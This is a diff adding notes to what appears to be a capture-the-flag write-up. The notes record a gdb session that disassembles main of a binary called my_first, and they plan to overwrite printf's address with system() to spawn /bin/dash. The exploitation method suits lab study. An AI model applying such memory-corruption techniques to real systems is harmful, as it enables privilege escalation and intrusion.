@@ -304,3 +304,34 @@ $1 = {<text variable, no debug info>} 0x40069060 <system>
 (gdb)
 So the address of system is 40069060
 Overwrite the address of printf with system and execute /bin/dash
+Find a function before printf to break, so disassemble the main function
+mike@pegasus:/home/mike$ gdb -q ./my_first
+gdb -q ./my_first
+Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
+(gdb) disas main
+disas main
+Dump of assembler code for function main:
+   0x0804850c <+0>:     push   %ebp
+   0x0804850d <+1>:     mov    %esp,%ebp
+   0x0804850f <+3>:     and    $0xfffffff0,%esp
+   0x08048512 <+6>:     sub    $0x20,%esp
+   0x08048515 <+9>:     movl   $0x8048870,(%esp)
+   0x0804851c <+16>:    call   0x80483d0 <puts@plt>
+   0x08048521 <+21>:    movl   $0x8048894,(%esp)
+   0x08048528 <+28>:    call   0x80483d0 <puts@plt>
+   0x0804852d <+33>:    movl   $0x80488b5,(%esp)
+   0x08048534 <+40>:    call   0x80483d0 <puts@plt>
+   0x08048539 <+45>:    movl   $0x80488c7,(%esp)
+   0x08048540 <+52>:    call   0x80483d0 <puts@plt>
+   0x08048545 <+57>:    movl   $0x80488d6,(%esp)
+   0x0804854c <+64>:    call   0x80483d0 <puts@plt>
+   0x08048551 <+69>:    movl   $0x80488e8,(%esp)
+   0x08048558 <+76>:    call   0x80483d0 <puts@plt>
+   0x0804855d <+81>:    movl   $0x80488fb,(%esp)
+   0x08048564 <+88>:    call   0x80483d0 <puts@plt>
+   0x08048569 <+93>:    movl   $0x8048905,(%esp)
+   0x08048570 <+100>:   call   0x80483b0 <printf@plt>
+   0x08048575 <+105>:   mov    0x8049c20,%eax
+   0x0804857a <+110>:   mov    %eax,0x8(%esp)
+---Type <return> to continue, or q <return> to quit---
+So the address of our choice is 0x08048569
